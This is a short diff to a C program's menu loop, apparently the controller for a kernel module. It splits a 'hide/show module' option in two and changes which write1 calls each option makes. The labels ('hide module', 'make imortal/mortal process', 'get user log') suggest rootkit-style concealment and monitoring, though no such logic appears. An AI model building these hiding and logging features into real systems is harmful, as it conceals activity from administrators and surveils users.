@@ -16,7 +16,8 @@ int main (int argc, char *argv[]){
 	printf("--1. input userid\n");
 	printf("--2. get user log\n");
 	printf("--3. make imortal/mortal process\n");
-	printf("--4. hide/show module\n");
+	printf("--4. hide module\n");
+	printf("--5. show module\n");
 	printf("----------------------\n");
 	
 	while(strcmp(input, "quit")!= 0){
@@ -27,8 +28,10 @@ int main (int argc, char *argv[]){
 			int uid=0;
 		}else if(strcmp(input,"2") == 0){
 		}else if(strcmp(input,"3") == 0){
-			write1(3);
 		}else if(strcmp(input,"4") == 0){
+			write1(4);
+		}else if(strcmp(input,"5")==0){
+			write1(5);
 		}else{
 			printf("no such function\n");
 		}
